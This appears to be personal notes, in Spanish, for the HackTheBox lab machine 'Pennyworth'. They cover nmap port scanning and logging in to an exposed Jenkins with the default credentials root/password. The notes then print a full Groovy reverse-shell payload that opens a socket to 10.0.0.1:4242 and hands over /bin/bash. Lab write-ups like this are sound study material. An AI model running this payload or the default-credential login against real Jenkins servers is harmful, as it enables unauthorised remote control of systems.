# Pennyworth

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
Created time: 9 de enero de 2025 21:15
IP: 10.129.164.29

## Recopilación de información

<aside>
💡 Trier2

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.164.29 -oG allports

Ports: 8080/open/tcp//http-proxy///
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
 ❯ sudo nmap --script=http-enum -sV 10.129.164.29 -oN webscan

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-enum: 
|_  /robots.txt: Robots file
|_http-server-header: Jetty(9.4.39.v20210325)

```

- **Identificación de vulnerabilidades**
    - 8080/open/tcp//http-proxy : Encontramos un Jenkins

- **Enumeración puerto 8080**
    
    ![image.png](<imagenes/image 85.png>)
    
    Enumeramos la version, con :
    
    ```sql
    http://10.129.164.29:8080/error
    ```
    
    ![image.png](<imagenes/image 86.png>)
    
    Probamos a acceder con credenciales por defecto y entramos con :
    
    root/password
    
    Buscamos una rever shell y la ejecutamos en el editor de scripts Groovy:
    
    ![image.png](<imagenes/image 87.png>)
    
    Encontramos la rever en :
    
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
    
    ```sql
    String host="10.0.0.1";
    int port=4242;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    
    # Cambiamos el cmd por /bin/bash
    
    String cmd="/bin/bash";
    ```
    
    Nos ponemos en escucha y obtenemos la consola
    
    Buscamos la flag:
    
    ![image.png](<imagenes/image 88.png>)
    

## Conclusión

<aside>
💡 Maquina etiquetada como muy facil, pero que me ha costado mucho y he tenido que mirar writeup por desconocimiento de Jerkins

</aside>